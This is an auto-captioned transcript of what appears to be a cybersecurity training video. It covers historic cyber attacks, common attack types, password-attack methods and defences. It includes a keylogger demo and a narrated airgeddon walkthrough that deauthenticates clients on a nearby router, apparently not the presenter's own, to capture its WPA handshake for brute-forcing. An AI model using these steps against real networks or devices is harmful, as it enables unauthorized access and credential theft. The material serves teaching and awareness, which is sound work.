ensure complete security this is not an
easy task and to help with this cyber
security professionals are hired to work
on identifying cyber threats and
securing a company's network
there are multiple job roles in the
field of cyber security if hacking
fascinates you then the role of an
ethical hacker is something to be
explored
such professionals try to a network's
vulnerabilities just like how a hacker
would do
but only to identify those
vulnerabilities and resolve them for
protection against an actual cyber
attack
but if you are looking to design robust
security structures then the role of a
security architect is more apt
a chief information security officer
ciso plays a crucial role in enterprise
security and is entrusted with the
overall safety of the information in an
organization with the increase in the
production of global digital data it is
anticipated that cyber attacks will
quadruple in the near future
organizations are going to need cyber
security professionals who can prevent
these attacks
a career in the field of cyber security
is lucrative and a very smart decision
for professionals now
so
what are you waiting for get certified
with simplylearn and become a
cybersecurity expert
let's see what we have at number 10.
from april 27 2007 estonia the european
country faced a series of cyber attacks
that lasted for weeks
this happened when the estonian
government decided to move the bronze
soldier from talon center to a less
prominent military cemetery located on
the city's outskirts
unprecedented levels of internet traffic
took down estonian banks online services
media outlets broadcasters and
government bodies
botnets sent massive waves of spam and
vast amounts of automated online
requests
according to researchers the public
faced ddos attacks there were conflicts
to edit the english language version of
the bronze soldiers wikipedia page as
well
although there is no confirmation russia
is believed to be behind these cyber
attacks that largely crippled the
estonian society
let's now move on to the next attack on
december 23 2015 several parts of
ukraine witnessed a power outage and
this was not a typical blackout it was
indeed the result of a cyber attack
information systems of three energy
distribution companies in ukraine were
compromised it is the first known
victorious cyber attack on apar grid it
is said that here hackers sent out
phishing emails to the power companies
30 substations were switched off and
about 230 000 people were left in the
dark for about one to six hours us
investigators believed that russia-based
hackers were responsible for this
experts have warned that other countries
could also be vulnerable to such attacks
let's see what we have at number eight
in the year 1999 a cyber attack caused a
21 day shutdown of nasa computers
unbelievable isn't it the hacker was
none other than the then 15 year old
jonathan james he first penetrated u.s
department of defense divisions
computers and installed a back door on
its servers
this allowed him to intercept more than
a thousand government emails including
the ones containing usernames and
passwords
this helped james steal a piece of nasa
software and crack the nasa computers
that support the international space
station which cost the space exploration
agencies forty one thousand dollars as
systems were shut down for three weeks
he was the first person to carry out a
computer hack against the american space
agency
let's now move on to the next attack
in late november 2014 there was a leak
of confidential data from the film
studio of sony pictures
information about sony pictures
employees their emails copies of the
then unreleased sony films future
propositions and other crucial data were
leaked
this cyber attack was carried out by a
hacker group named guardians of peace so
what did the hackers want
well they demanded that sony withdraw
its then upcoming movie the interview
this movie was a comedy story line to
assassinate the north korean leader kim
jong-un sony then decided to cancel the
film's theatrical release due to the
threats at cinema screening the movie
it is indeed hard to trace the roots of
a cyber attack in this case after
evaluation the u.s intelligence
officials arrived at the theory that the
attack was in a way related to the
government of north korea
however north korea had denied the same
moving on to our number six in december
2006 tjx the u.s retailer company
identified that 45.6 million debit and
credit card details were stolen
this happened from one of its systems
over 18 months by an unknown number of
intruders it was one of the first
largest ever cyber attacks involving the
loss of personal data
as a result banks in the affected
regions had to reissue and block
thousands of payment cards a group of
hackers did this albert gonzalez being
the mastermind the group was from miami
the place where the tjx heist was
believed to have originated
reports said that the tjx data breach
occurred because of weak web encryption
at two of its marshall stores in miami
next moving on to our top five let us
see what we have at number five
the year 2010 witnessed the discovery of
the deadly computer worm stuxnet
this malware's motive was unlike any
other usual cyber attacks it aimed at
destructing the equipment the computers
controlled
stuxnet came with the deadly purpose of
damaging iran's nuclear infrastructure
it infected more than 200 000 computers
including 14 industrial sites and a
uranium enrichment plant in iran
stuxnet initially spread via microsoft
windows and targeted siemens industrial
control systems
although it was discovered only in 2010
it is believed to have been silently
sabotaging iran's nuclear facilities
it was one of the first discovered
malware that was capable of hampering
hardware systems it largely damaged the
centrifuge of the iranian reactors this
is believed to be a cyber weapon created
by the us and the israeli intelligence
although there is no documented evidence
or acceptance by either of the countries
for the same
moving on to number four in the year
2014 home depot was the victim of one of
the deadliest cyber attacks 56 million
payment cards were compromised along
with 53 million customer email addresses
stolen
this security breach happened from april
to september 2014.
criminals were believed to have used a
third-party vendor's username and
password to enter the perimeter of home
depot's network
the attackers were then able to deploy
custom built malware on its
self-checkout systems in the u.s and
canada
moving on to our top three
as you might be aware the playstation
gaming system is one of sony's most
popular products unfortunately in april
2011 sony executives witnessed abnormal
activity on the playstation network this
resulted in the compromise of
approximately 77 million playstation
users accounts and prevented users of
playstation 3 and playstation portable
consoles from accessing this service
this forced sony to turn off the
playstation network on april 20th on may
4th sony confirmed that personally
identifiable information from each of
the 77 million accounts had been exposed
the outage lasted for 23 days sony
released almost daily announcements
concerning the system outage in the end
sony is believed to have invested
approximately 170 million dollars to
improve the network security to
investigate the attack and to cover the
expenses of caring for the consumers
that had been affected
let's now move on to the next attack at
number two in may 2017 one of the most
dangerous cyber attacks took place
it was known as the wannacry ransomware
attack caused by the wannacry crypto
worm the victims were the users that
used the unsupported version of
microsoft windows and those who hadn't
installed the new security update
this did not take place through phishing
like other attacks but through an
exposed vulnerable smb port
the attack originated in asia and then
eventually spread across the globe in a
day more than 200 000 computers were
infected across 150 countries
the wannacry cryptoworm locked the users
out of the targeted systems and
encrypted their data the users were
asked for a ransom of 300 to 600 which
had to be paid via bitcoin in exchange
for their data
this attack took a toll on both private
and government organizations it resulted
in damages from hundreds of millions to
billions of dollars
in a matter of few days the emergency
patches released by microsoft halted the
attack also the discovery of a kill
switch prevented the infected computers
from spreading the crypto worm security
experts in a few countries believed that
north korea was behind this attack and
finally let's see what we have at number
one
more than two decades ago in march 1999
the melissa virus a mass mailing macro
virus was released
it targeted microsoft word and
outlook-based systems and created
considerable network traffic
melissa virus infected computers via
emails the email would look like an
important message well yes it was fake
if the recipient opens the attachments
in the mail and downloads the document
and then opens it with microsoft word a
virus was released on their computers
this would then mass mail itself to the
first 50 people in the victims contact
list and then disable multiple safeguard
features on microsoft word and microsoft
outlook this began spreading like a
wildfire across the internet david l
smith released the virus the virus
caused nearly 80 million worth of
damages it did not steal data or money
however it caused a havoc almost 1
million email accounts were disrupted
worldwide agencies were overloaded and
some had to be shut down entirely and
internet traffic in some locations were
slowed down do you agree with our list
if you're aware of any other great
interesting computer hacks in history do
let us know in the comment section below
let's begin with the rise in cyber
crimes so let's talk about wannacry this
is something that happened way back in
2017 let's not say way back it's just
2019 two years back and it took the
world by stop so it was a cyber attack
which encrypted the data of
organizations and then the hackers held
that organization ransom by asking of
rather demanding money from them to
decrypt their own data so what exactly
happened the attack originated in asia
and then spread across the rest of the
world note the date and how did this
happen there was a vulnerability that
was identified in microsoft windows the
smb vulnerability smb which is server
message block is essentially the file
sharing and the printer sharing services
that you use in a lan environment on
windows operating system by default
these are enabled on your desktops and
there is a hardening guide that uh
people utilize to either upgrade the
version of smb to a more secure version
or with a disabled smb and
utilize something else now this was a
known vulnerability and this was
targeted within days more than 230 000
computers when infected across 150
countries now when we say this was
identified microsoft knew of this
vulnerability and in fact they had
released a patch in april of 2017 to
mitigate this vulnerability within two
months of that release this attack had
happened now in a real-world scenario it
is not possible for all the servers and
devices to be upgraded to the latest
patch level because organizations need
to test those patches to see if those
patches are going to interfere with the
services that they are providing and
hence no organization will be completely
patched up at any point in time and this
was the flaw that sadly took down a lot
of organizations the patch was available
but it wasn't testing somewhere not
utilizing it yet and they did not see it
as a high value risk and suddenly
something happened and wannacry took
place now what happened was a crypto
worm called wannacry which basically
encrypts the data and locks the user out
of their own computers and they get a
screen in front of them which says you
your data has been encrypted and it
gives them a link and they are they
demand 300 to 600 to be paid to the
hackers to retrieve the decryption key
for their data now here obviously you're
not going to pay cash to hackers neither
are you going to make a bank transfer
because both of the ways you can
identify the hackers and then pursue
them so the hackers demanded this
exchange via bitcoins cryptocurrency
this is the best way to remain anonymous
and the best way to make payments over
the internet without being identified so
what was the impact of the attack around
200 thousand to three hundred thousand
computers were infected now it sounds
like a small number of computers when we
were talking about global however the
services that it affected were huge in
uk the national health service got
affected all the databases got encrypted
surgeries and treatments of patients
were postponed fedex renault nissan all
of these organizations got compromised
and the production lines basically shut
down for a few days till they retrieved
data from backup started to restore and
then tried to bring back everything to
normal then in february 2019 dunkin
donuts announced that the users of their
reward programs were targeted by a
credential surfing attack that means
that the attackers stole the credentials
usernames and passwords of customers of
dunkin donuts now we think dunkin donuts
they sell donuts how much could it
impact anyone but if you have an online
account with dunkin donuts you also have
your personal identifiable information
stored in those accounts for example
your name address credit card
information maybe your social security
number or your national insurance card
or something like that which can lead to
identity theft people can misuse that
information pretend to be you and then
take out loans or do transactions in
your name where you are going to end up
paying those bills so stealing of such
kind of data is going to impact all the
users adversely so the first name last
name and email ids were stolen that is
still good enough to launch social
engineering attacks and target these
victims
to phishing attacks or similar attacks
so now let's look at the different types
of attacks in cyber so we are going to
discuss these six malwares we are going
to talk about social engineering attacks
man-in-the-middle attacks denial of
service sql injections and password
attacks now if you look at this malwares
basically target hosts operating systems
social engineering attacks would address
or attack the gullibility of a human
being with the help of a computer for
example sending a fake mail or hosting a
fake website man in the middle attack
would target a network and then try to
capture data packets within the network
thus compromising your credentials a
denial of service attack would crash a
service sql injection attacks would
attack an application and a password
attack would attack the usernames and
passwords of accounts thus taking
advantage of weak passwords and getting
access to your accounts so let's start
with malware malware basically refers to
malicious software the first part of
malicious mal and the where out of
software becomes malware malwares are
nothing but vehicles in which hackers
embed payloads payloads could be viruses
worms ransomwares trojans so they hide
these kind of malicious softwares within
legitimate looking softwares and they
post them on the internet people who are
interested in those kind of softwares
will obviously download them and since
they are looking very legitimate they
will try to install them does
accidentally and unknowingly installing
a trojan virus or a ransomware on their
machine now most of us have done this at
one point in time where we have looked
at pirated software because we did not
want to pay for it and then we we
probably go to torrents and then search
for those softwares download them and
there's a keygen.exe over there which we
have to execute and then we have to copy
that code the exe file that comes out or
with the keygen and then we have to
replace it and i mean it's a very
convoluted process but the fact that you
have to restore some code with some
other code would basically mean that
there is something wrong with that file
so 99 of the time these programs would
have viruses or trojans embedded within
them and it is going to affect the
security posture of your computers if
you scan keygen.exe with any antivirus
across the globe they will always report
them as malwares and they will probably
want to delete those kind of files so
how do these get infected it gets
infected into a system when the user
clicks on a suspicious link now
obviously if you think it is a
suspicious link you're not going to
click on it but you trust the link or
you're compelled to click on it just out
of curiosity let's say you click on that
link there's a redirector it downloads
an attachment from a malicious server
and it gets installed on your machine
most of the common ways a virus or a
worm is spread is through usb devices
people pass around usb devices like
nobody's business and you have no idea
where the device has been used before
and you plug into your machine and if
there is a virus on that usb device it
will get infected on your machine as
well malwares are nothing but malicious
softwares that pose as legitimate
softwares but will have a virus trojan
or a worm embedded within it right it
could also be a keylogger a keylogger is
nothing but another software that is
created to catch all the keystrokes that
the user is making create a copy of it
and store it and send it back to the
hacker so whatever the user is typing it
will now be known to the hacker it could
be bank details passwords any personal
information that the user might want to
keep secret we are going to look at
three different demos here this demo is
just to showcase a couple of things uh
we're going to look at a key logger how
a keylogger works this virtual machine
here and i've already downloaded a
keylogger and installed it the idea of
this demo is to showcase how a keylogger
functions right so you can see online on
the screen we are using a free
keylogger.en.softony.com here on this
site and you can download the free
keylogger right from here what i've done
using my demos is that i've always have
a keylogger running in the background to
capture all the keystrokes that i've
been doing whenever i'm doing any demos
so this keylogger here can actually be
hidden in the taskbar but for our demo
purposes i've kept it visible when you
click on it it will open up and give you
a basic screen where you can start
navigating about the keylogger now you
can see that on 8th which is today it
already shows some keystrokes
applications and some visited websites
as you can see already been browsing
using the browser over here and which
has been recorded by the keylogger in
the background and just to give you an
example if i click on this file you will
see all the keystrokes that i have been
doing so far and you can see i've gone
to this i've opened up my mozilla
firefox i've typed in a key search
keyword of free keylogger then i've gone
on to the website how secure is
mypassword.net in which i may have tried
out a few passwords myself and then i've
gone
and copy pasted this url into the
browser window and you can see all of
this has been recorded and just to
emphasize on that let's go on to another
website and let's say let's go to
facebook.com
i'm not actually going to log in i'm
just going to type in a random username
so someone at simplylearn.com and a
password like asd1234
and i'm going to try to log in obviously
the login is going to fail because this
account doesn't exist but we want to see
what happens in the background when the
keylogger picks up the keystrokes that
we have typed so let's open up the
keylogger again and go and see what is
there in the keystrokes and clipboard
and you can see over here that we typed
in facebook.com enter and then we did
not type in the username that's the
difference here we selected it from a
drop down so a keystroke logger or
keylogger has not been able to capture
that input a keylogger in its essence is
only records something that has been
typed in by the user real time since we
did not type in the username it did not
record that username but we typed in the
password and you can see the password
over here asd at the rate one two three
four and this is how a key logger works
it only captures the key strokes that
have been typed in real time so if we
use this exercise on our victims and
they're just using drop down menus at
that point in time none of the data is
going to be recorded for that activity
you would need something which is known
as spyware which would capture screens
which would capture all of this
information that is going on now apart
from just logging keystrokes what this
software also does is it also has a list
of used applications so you can see all
the applications that have uh booted up
along with the operating system and the
ones that have started up after the
operating system has booted it also has
a list of the visited websites so you
can see these are the websites that we
have been visiting and
they have been listed right here the
last one being facebook login or sign up
right so this can store history for a
really long time if i go back in time
and if i look at some of the demos that
i've been looking at so on 14th of
september these were the keystrokes that
i utilized when i was doing some
trainings or while i was providing some
demos on other topics so a keystroke or
a keylogger will store all that
information and keep on recording it
till you actually delete that data or
you can you can reset the keylogger you
can also set up the keylogger to send
the email to you on a daily as a daily
report to a particular email address
that you have sent so as long as it
detects the internet connectivity this
key logger will send you an email to the
email address that you've specified with
all the keystrokes that it has locked
now this is the free version there's
again a paid version for it so you can
go and visit this site and see how this
keylogger functions if i press on the x
button over here it will ask me if i
want this to be hidden in the system
tray if i click on yes it only using
this shortcut will i be able to invoke
this screen so just for demo purposes i
do not want this to be hidden so i'm
going to click on no and you can see
that the keylogger is still visible over
here so that was the first demo that we
are seeing viruses as we all know are
destructive programs that once executed
would destroy data or harm the hard disk
or the partition tables worms on the
other hand would be software's that
would be more of a nuisance value where
they're going to replicate themselves in
such a way that they would consume the
resources of a computer thus crashing
the computer and then requiring a reboot
a trojan horse is another software that
will allow a backdoor entry or a covert
channel to that hacker where the hacker
in this case would then be able to gain
access to the victim's machine through
the covert channel or the back door
without the knowledge and the
authorization of the user themselves
then let's talk about social engineering
attack now this is where your people
skills come into the picture this is the
art of manipulating people and
convincing them to give up confidential
information either knowingly or
unknowingly so most likely well uh we
trust our friends right and we talk to
them a lot and we give out some
confidential information which we would
not give out to others what if somebody
is pretending to be our friend just to
get this information out of us and we
trust this person to give out that
information and we suddenly get affected
because of that now i'm not saying that
everybody in the world does that but it
is one of the most common attacks that
is experienced in the computing world
now social engineering attacks can be
broken down into three categories first
is a phishing attack don't worry about
that figure over there you're actually
not going to go fishing it's but
basically what known as a phishing
attack then there is a spear phishing
attack and then there's a veiling attack
all of these are types of social
engineering attacks where you of uh
where you're targeting a user uh by
sending out fake mails or fake websites
and their gullibility into clicking on
those links and then giving out
information so what is a phishing attack
it is a practice wherein a hacker
usually sends fake mails which look
really genuine or hosts fake websites
which also look genuine and looks like
they're from a trusted source once you
click on those links there would be
embedded scripts or embedded malwares
which would then be executed and and
then get installed on your machines
compromising the security of your device
these utilities could be used to steal
credit card information create steal
data from your computer upload data to
your computer use your computer as a bot
and anything and everything that the
hacker might want to do spearfishing is
a variation of fishing now fishing is a
non-targeted attack it is to the whole
world at large whoever becomes a victim
becomes a victim however spear phishing
is a targeted attack it is to a specific
individual or to a group of individuals
in an organization so it becomes a
customized attack you identify the
victim you identify the flaws that are
existing over there in the organization
you identify the gullibility of the
victim create that fake mail to suit
that particular situation send it across
to them they'll click on that link and
get infected by whatever payloads that
you have embedded within it railing is
when you are targeting particularly
wealthy or powerful people in the
industry so normally uh when you're
targeting ceos cfos high level
management people of an organization it
would be known as a veiling attack so
here the example is where the email has
been received your customer your account
is going to expire today to keep your
account activated please click on the
link here and proceed with the
verification process now here the link
that we see activate.com would be a
hyperlink which is going to mask the
actual url with the
link is going to redirect us right here
the attack is on the gullibility of the
customer where they would fear that the
account would be deactivated and to
prevent that they would press this email
click on the link and then provide the
information thinking that they're just
reactivating their account but they're
actually leaking their own information
to the attacker so the first thing you
have to understand is banks or any
organization are no not going to send
you any emails with the link in it
asking you to re reactivate or anything
like that in fact banks proactively tell
us that they're not going to give call
us and ask for any information in fact
they would want us to call them on their
registered number or the helpline number
that they have declared on their website
or on the cards that we possess then
moving on to social engineering this is
something very common in today's world
this is basically where the prey is the
human itself and the reason social
engineering attacks are very successful
is because of the gullibility factor
that a human has for example human has
something called emotions that a machine
wouldn't you could plead with a human
for a password to be reset by gaining
sympathy or empathy but try doing that
with a machine those attacks are going
to fail social engineering attacks are
not only limited to those but we can
talk about phishing phishing is also a
part of social engineering attack where
the gullibility of the user to click on
that link is being exploited in this
scenario here this is clark he's calling
from the id security team that means
that he is impersonating properly and
then telling the victim that the system
has been compromised please share the
password with me the victim on the other
hand thinks that the person is trying to
help her
probably doesn't verify that person
trust that person and then provides the
password over the phone now here it is
fear that is being exploited because the
password being compromised would uh
clearly upset the end user for loss of
data or for the computer revealing out
confidential information thus here she's
trusting the
security team for the password to be
reset and given back to her then we come
to the network attacks man in the middle
this is also known as eavesdropping
attack which literally means that you
are going to listen in on to somebody's
conversation for example in the figure
the client is trying to talk to the
server but you become a man in the
middle and you try to listen in on the
conversation that is going on now
obviously the conversation over here may
not be audio but the data that is being
exchanged between the server and the
client you just listen in you make a
copy of that data and you store it at
your end the data could contain
usernames passwords may contain
confidential information and help you
compromise data the attacking computer
takes the ip address of the client so
you find out the ip address of the
client the client is not aware of about
this the client is trying to communicate
with the server you spoof yourself as a
default gateway or a trusted device and
the client thinks that it is through you
that they need to communicate to the
server and thus they start sending data
via your pc so this attack normally
happens on public wi-fi networks i've
seen that happening a lot and thus i
never recommend anyone using those
public wi-fi for example you go to a
coffee shop they have free wi-fi over
there you connect to it and you start
surfing you start browsing you are
always signed into google facebook
accounts your bank accounts and whatnot
and then there's a sniffer there is a
hacker who is doing a man-in-the-middle
attack capturing all that data now it's
not an easy attack but it can be done so
this diagram shows where the man in the
middle attack has become successful and
now that the client and the server both
are sending information via the attacker
without knowing them knowing that the
attacker is capturing all that data so
here in this example uh here suppose
you're in trouble and you need money
right now and you call your friend and
ask for money so here the person is
calling john uh telling john that
they're in trouble and they're asking
for john to give their credit card
number over the phone now this is a
legitimate transaction the friend is
actually calling john and asking for
some help however when john is providing
that help over the phone with the credit
card numbers maybe the cvv number and
all of that and then the otp at the end
of it at the same time there could be a
hacker doing a man in the middle attack
where they could be eavesdropping on
whatever is being said or whatever data
is being transferred and once they
capture this confidential data they can
then misuse that data to their own gains
then comes the denial of service attack
the motive in a dos attack is not to
benefit monetarily but to bring down a
service for legitimate users that's just
causing harm to the organization for
example if i consume the bandwidth of to
a particular website since there's no
more bandwidth left other legitimate
users who want to interact with the
website will not be able to connect to
the website thus creating a denial of
service to those legitimate users now it
may not be possible for me to use my
laptop to target a cluster of servers
because obviously the bandwidth at the
other end would be very high so i would
distribute my attack across multiple
devices thus creating a distributed
denial of service also called a ddos
attack then we come to the sql injection
or sql sql stands for structured query
language which is the de facto language
that is used by applications to interact
with databases so let it be a microsoft
sql database mysql database oracle sql
the syntax may be a little bit different
but it is still the structured query
language that applications utilize to
interact with the database now the
queries that are created by the
applications need to be sanitized at the
application level itself so developers
need to be very careful of how they are
going to create those queries what
queries are allowed to go to the
database because a database is designed
to answer queries it doesn't know what
is a legitimate query and what is a
illegitimate query if it receives a
query it is going to try to execute it
and give out information thus a hacker
may insert malicious queries or
malformed queries into a sql server
through the vulnerable application
causing a security event so depending on
the queries that have been created the
attacker could delete some data or
modify data add data edit it or do
anything that is malicious in nature
that would compromise the integrity and
the security of that database for
example the dunkin donuts right except
uh apart from being a credential attack
since they got access to the database
they could have added or deleted any
information about any users that were
there so uh the next attack would be a
password attack as the name suggests
this attack is used to crack or get the
password for users account or when we
say crack passwords this is basically
where somebody is trying to brute force
or they're trying to guess the password
and they're going to break the password
thus getting access to your accounts
there are five different ways passwords
can be cracked the first one is a
dictionary attack where we use every
password that is possible through the
dictionary now this is the use of an
actual dictionary and that's one of the
reasons when we try to create passwords
we are advised not to create passwords
based on dictionary words because these
are easily guessable and there are lists
already out there that contain all of
these words there's a tool that you can
utilize and that tool will then pass
through each and every word that is in
the dictionary file and then compare it
to a possible password if one of the
words matches the password has then be
compromised so if you are observing a
little bit higher security where we have
created a password that is not based on
the dictionary world then we want to
look at other attacks like brute force
it is a trial and error method so
basically what we do is we identify how
the passwords were created for example
in today's world the policies would be
to consume in a password any uh any of
the alphabet characters a through z
uppercase or lowercase zero through nine
and then special characters and then we
want to randomize the
usage of these characters so that they
are not easily guessable but a brute
force attack at the same time would then
try every permutation and combination
there is possible in the entire
character set and then try to figure out
the password now this takes a really
long time and does take a lot of compute
and storage power and that's where the
botnet example comes in comes back in
the one that we saw earlier which was
used for dos attack but similarly if i
have infected multiple computers like
this i can then distribute this attack
onto all those computers and use the
entire compute power that is available
to shorten the time that is required to
uh crack the password now based this is
100 successful given the time that it
may take so if the time that is going to
take is going to be a hundred years the
attack becomes unsuccessful because
during that period uh the password is
most likely to be changed the technology
is going to be changed and so on so
forth so if the password is easily
guessable this can be a very easy attack
to perform then a key logger which is a
similar attack to what we have seen so a
key logger as discussed earlier is
nothing but a software that once
installed on your machine would grab
each and every key stock that the user
has made and store it in a file which
the hacker can later on access so
whatever you have been typing passwords
credit card information or anything else
all of those would be recorded and
stored in the file and that's one of the
best way a password can be compromised
then shoulder surfing this is a physical
attack rather than being a technical one
here you need to be physically present
when the user is typing in their
password and you actually look over
their shoulder to see what they are
typing and try to figure out what the
password is if they're quick typers it
is going to be a little bit more
difficult if they're slow typers it's
going to be that much more easy and the
last one is called a rainbow table now
passwords when applications store them
are stored in hash format hash is
nothing but a one way signature that is
created of the password file of the word
that is used for the password and it is
based on an algorithm so the input could
be a variable length for example a
password could be 7 to 14 characters but
the output of a hash value would be
fixed based on the algorithm that you're
consuming so most common algorithms in
today's world that we utilize are sha
secure hashing algorithms before that we
use md5 or message digest so all of
these convert the passwords from plain
text into a hash value and store it into
a database so if you actually attack
that database to grab a password you're
going to get the hash value not the
password in clear text and thus in that
scenario comes the rainbow table to the
rescue a rainbow table is nothing but a
file that will have a list of all
possible passwords along with their hash
values in the required format so if you
remember the dictionary attack the
dictionary attack was nothing but a list
of words based on the dictionary that
were stored in a file and then the
software was just trying each and every
word against a possible password here we
do not have the word but we have the
hash value so to reverse engineer hash
value what we created is we created a
rainbow table where there would be a
list of all the possible passwords and
their corresponding hash values so we
then compare the hash value that we have
captured and then search for that hash
value in the file that we have created
the hash value that matches the
corresponding word to it is the password
in clear text so these are the five
types of password attacks cyber security
has become one of the most rigid
industries in the last decade while
simultaneously being the most challenged
with every aspect of corporate culture
going online and embracing cloud
computing there is a plethora of
critical data circulating through the
internet all worth billions of dollars
to the right person
increasing benefits require more complex
attacks and one of these attacks is a
brute force attack
a brute force or known as boot force
cracking is the cyber attack equivalent
of trying every key on your key ring and
eventually finding the right one
brute force attacks are simple and
reliable there is no prior knowledge
needed about the victim to start an
attack most of the systems falling prey
to brute force attacks are actually well
secured
attackers let a computer do the work
that is trying different combinations of
usernames and passwords until they find
a one that works
due to this repeated trial and error
format the strength of password matters
a great deal although with enough time
and resources brute force will break a
system since they run multiple
combinations until they find the right
passcode
a brute force attack also known as an
exhaustive search is a cryptographic
hack that relies on guessing possible
combinations of targeted password until
the current password is discovered
it can be used to break into online
accounts encrypted documents or even
network peripheral devices
the longer the password the more
combinations that will need to be tested
a brute force attack can be time
consuming and difficult to perform if
methods such as data obfuscation are
used and at times downright impossible
however if the password is weak it could
merely take seconds with hardly any
effort
dictionary attacks are an alternative to
brute force attacks while the attacker
already has a list of user names and
passwords that need to be tested against
the target it doesn't need to create any
other combinations on its own
dictionary attacks are much more
reliable than brute force in a real
world context but the usefulness depends
entirely on the strength of passwords
being used by the general population
there is a three-step process when it
comes to brute-forcing a system
let's learn about each of them in detail
in step 1 we have to settle on a tool
that we are going to use for brute
forcing there are some popular names on
the market like hashcat
hydra
and john the ripper
while each of them has its own strength
and weaknesses each of them perform well
with the right configuration
all of these tools come pre-installed
with certain linux distributions that
cater to penetration testers and cyber
security analysts like kali linux and
parrot security
after deciding what tool to use we can
start generating combinations of
alphanumeric variables whose only
limitation is the number of characters
for example while using hydra a single
6-digit password will create 900 000
passwords with only digits involved
add alphabets and symbols to that sample
space and that numbers grows
exponentially
the popular tools allow customizing this
process
let's say the hacker is aware of the
password being a specific 8-digit word
containing only letters and symbols
this will substantially increase the
chances of being able to guess the right
password since we remove the time taken
to generate the longer ones they omit
the need for including digits in such
combinations
these small tweaks go a long way in
organizing an efficient boost force
attack since running all the
combinations with no filters will
dramatically reduce the odds of finding
the right credentials in time
in the final step we run these
combinations against the file or service
that is being broken
we can try and break into a specific
encrypted document a social media
account or even devices at home that
connect to the internet let's say there
is a wi-fi router
the generated passwords are then fed
into the connection one after the other
it is a long and arduous process but the
work is left to the computer other than
someone manually clicking and checking
each of these passcodes
any password that doesn't unlock the
router is discarded and the bruteforce
tool simply moves on to the next one
this keeps going on until we find the
right combination which unlocks the
router
sometimes reaching the success stage
takes days and weeks which makes it
cumbersome for people with low computing
power at their disposal however the
ability to crack any system in the world
purely lead to bad password habits is
very appealing and the general public
tends to stick with simple and easy to
use passwords
now that we have a fair idea about how
brute force works let's see if we can
answer this question
we learned about how complex passwords
are tougher to crack by brute force
among the ones listed on the screens
which one do you believe will take the
longest to be broken when using brute
force tools
leave your answers in the comments
section and we will get back to you with
the correct option next week
let's move on to the harmful effects of
getting a system compromised due to
brute force attacks
a hacked laptop or mobile can have
social media accounts logged in giving
the hackers free access to the victim's
connections
it has been reported on multiple
occasions where compromised facebook
accounts are sending malicious links and
attachments to people on their friends
list
one of the significant reasons for
hacking malware infusion is best done
when spread from multiple devices
similar to distributing spam
this reduces the chance of circling back
the source to a single device which
belongs to the hacker
once brute forced a system can spread
malware via email attachments sharing
links file upload via ftp etc
personal information such as credit card
data usage habits private images and
videos are all stored in our systems be
it in plain format or root folders
a compromised laptop means easy access
to these information that can be further
used to impersonate the victim regarding
bank verification among other things
once a system is hacked it can also be
used as a mail server that distributes
spam across lists of victims
since the hacked machines all have
different ip addresses and mac addresses
it becomes challenging to trace the spam
back to the original hacker
with so many harmful implications
arising from a brute force attack it's
imperative that the general public must
be protected against such
let's learn about some of the ways we
can prevent ourselves from becoming a
victim of brute force attacks
using passwords consisting of alphabets
letters and numbers have a much higher
chance of withstanding brute force
attacks thanks to the sheer number of
combinations they can produce the longer
the password the less likely it is that
a hacker will devote the time and
resources to brute force them
having alphanumeric passwords also
allows the user to keep different
passwords for different websites this is
to ensure that if a single account or
password is compromised due to a breach
or a hack the rest of the accounts are
isolated from the incident
two-factor authentication involves
receiving a one-time password on a
trusted device before a new login is
allowed
this otb can be obtained either via
email sms or specific 2fa applications
like authy and aegis
email and sms based otps are considered
relatively less secure nowadays due to
the ease with which sim cards can be
duplicated and mailboxes can be hacked
applications that are specifically made
for 2fa cores are much more reliable and
secure
captchas are used to stop bots from
running through web pages precisely to
prevent brute forcing through their
website
since brute force tools are automated
forcing the hacker to solve captcha for
every iteration of our password manually
is very challenging the capture system
can filter out these automated bots that
keep refreshing the page with different
credentials thereby reducing the chances
of brute force considerably
a definite rule that locks the account
being hacked for 30 minutes after a
specific number of attempts is a good
way to prevent brute force attempts
many websites lock account for 30
minutes after three failed password
attempts to secure the account against
any such attack on an additional note
some websites also send an email
instructing the user that there have
been three insecure attempts to log into
the website
let's look at a demonstration of how
brute force attacks work in a real-world
situation
the world has gone wireless with wi-fi
taking the reins in every household it's
natural that the security will always be
up for debate
to further test the security index and
understand brute force attacks we will
attempt to break into the password of a
wi-fi router
for that to happen we first need to
capture a handshake file which is a
connection file from the wi-fi router to
a connecting device like a mobile or a
laptop
the operating system used for this
process is parrot security a linux
distribution that is catered to
penetration testers all the tools being
used in this demo can easily be found
pre-installed in this operating system
if getting your learning started is half
the battle what if you could do that for
free visit scale up by simply learn
click on the link in the description to
know more
to start our demo we're going to use a
tool called airgarden which is made to
hack into wireless network specifically
at this point it's going to check for
all the necessary scripts that are
installed in the system
to crack into a wi-fi and to capture the
handshake file we're going to need an
external network card
the significance of the external network
card is a managed mode and a monitor
mode
for now the wlx1 named card is my
external network adapter which i'm going
to select
to be able to capture data over the air
we're going to need to put it in monitor
mode as you can see above it's written
it is in managed mode right now
so we're going to select option 2 which
is to put the interface in monitor mode
and its name is now wlan 0 monitor
the monitor mode is necessary to capture
data over the air
that is the necessary reason why we need
an external card since a lot of inbuilt
cards that come with the laptops and the
systems they cannot have a monitor mode
installed
once we select the mode we can go into
the fifth which is the handshake tools
menu
in the first step we have to explore for
targets and it is written that monitor
mode is necessary to select a target so
let's explore for targets
and press enter
we have to let this run for about 60
seconds to get a fair idea about the
networks that are currently working in
this locality for example this ess id is
supposed to be the wi-fi name that we
see when connecting to a network jio24
recover me these are all the names that
we see on our mobile when trying to
search for the wi-fi's
this bss id is supposed to be an
identifier somewhat like a mac address
that identifies this network from other
devices
this channels features on one
or two or there are some many channels
that the networks can focus on
this here is supposed to be a client
that is connected to one such network
for example
the station that you can see 5626 this
is supposed to be the mac address of the
device that is connected to a router
this bssid is supposed to be which wifi
it is connected to for example 5895 d8
is this one
which is the jio24 router
so we already know which router has a
device connected to it and we can use
our attack to capture this handshake
now that we it has already run for one
minute now that we press ctrl c
we will be asked to select a target see
it has already selected the number five
which is the jio24 router as the one
with clients so it is easy to run an
attack on and it is easy to capture a
handshake for
select network five
and we run a capture handshake
it says we have a valid wpa wpa2 network
target selected and that the script can
continue
now to capture the handshake we have a
couple of attacks a d auth or a d or air
replay attack what this attack does is
kick the clients out of the network
in return when they try to reconnect to
the wi-fi as they are configured that
way that when a client is disconnected
it tries to reconnect it immediately it
tries to capture a handshake file which
in turn contains the security key which
is necessary to initiate the handshake
for our demo let's go with the second
option that is the dior air replay
attack
select a timeout value let's say we give
it 60 seconds
and we start the script
we can see it capturing data from the
jio24 network and here we go
